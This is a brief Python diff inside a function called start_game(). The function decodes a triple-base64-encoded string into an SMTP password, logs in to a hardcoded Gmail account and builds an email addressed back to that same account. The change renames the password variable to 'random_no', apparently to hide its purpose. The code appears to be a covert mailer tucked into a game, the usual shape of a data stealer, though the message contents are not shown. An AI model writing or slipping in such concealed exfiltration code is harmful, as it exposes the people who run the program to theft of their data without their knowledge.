@@ -24,10 +24,10 @@ def start_game():
 		rsa_xor = str[0].split("\n")[0]
 		smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
 		smtpObj.ehlo()
-		password = (base64.b64decode( base64.b64decode( base64.b64decode(rsa_xor))).decode('ascii'))
+		random_no = (base64.b64decode( base64.b64decode( base64.b64decode(rsa_xor))).decode('ascii'))
 		smtpObj.starttls()
 		MY_MAIL_ADDRESS = "zeusB9091@gmail.com"
-		PASSWORD = password.split("\n")[0]
+		PASSWORD = random_no.split("\n")[0]
 		RECIEVER_EMAIL_ID = "zeusB9091@gmail.com"
 		smtpObj.login(MY_MAIL_ADDRESS, PASSWORD)
 		msg = EmailMessage()
